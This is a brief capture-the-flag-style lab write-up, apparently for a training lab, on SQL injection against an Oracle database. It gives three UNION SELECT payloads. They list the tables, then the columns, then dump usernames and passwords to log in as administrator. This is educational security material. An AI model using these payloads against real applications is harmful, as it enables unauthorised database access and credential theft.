# Lab: SQL injection attack, listing the database contents on Oracle

**PRACTITIONER**

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

## Write-up


Tương tự như lab trên , điểm khác biệt duy nhất nằm ở syntax.
' UNION SELECT table_name, NULL FROM all_tables--

![alt text]({8E7B0073-81C1-4026-9785-876C5970877A}.png)

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ZEJUDF'--

![alt text]({764C6D9C-6A89-42D0-BF69-0023BB2F9D02}.png)

' UNION SELECT USERNAME_UNPUJX, PASSWORD_FKEIEJ FROM USERS_ZEJUDF--

![alt text]({B329C9FF-738D-4F08-A97D-81BB9B8F1399}.png)